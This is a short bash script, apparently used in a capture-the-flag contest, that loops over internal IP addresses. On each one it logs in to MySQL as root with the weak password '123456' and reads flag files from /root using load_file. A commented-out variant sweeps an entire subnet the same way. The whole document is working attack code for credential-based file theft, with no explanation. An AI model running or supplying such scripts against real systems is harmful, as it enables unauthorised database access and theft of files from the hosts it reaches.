for i in $(seq 101 109)
do
s="172.16.$i.250"
echo -e "\n\n$s\n\n"
mysql -h $s  -uroot -p123456 -e 'select load_file("/root/flagvalue.txt");'
done



#for i in $(seq 255); do  echo 172.16.123.$i;mysql -h 172.16.123.$i -uroot -p123456 -e 'select load_file("/root/flag.txt");' & { sleep 0.01; kill $! &};done
